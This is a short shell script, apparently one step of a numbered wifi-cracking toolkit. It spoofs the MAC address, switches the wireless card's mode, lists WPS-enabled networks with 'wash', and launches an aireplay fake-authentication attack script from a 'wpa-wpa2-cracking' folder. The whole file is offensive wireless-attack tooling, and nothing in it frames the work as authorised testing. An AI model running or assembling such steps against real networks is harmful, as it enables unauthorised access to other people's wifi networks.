. ../config.sh

# list all wps enabled wifi networks
cd ..

./1-mac-change.sh
./2-change-device-mode.sh

cd wpa-wpa2-cracking

wash --interface $myWifiDevice

cd ..
./7-aireplay.fakeauth-attack.sh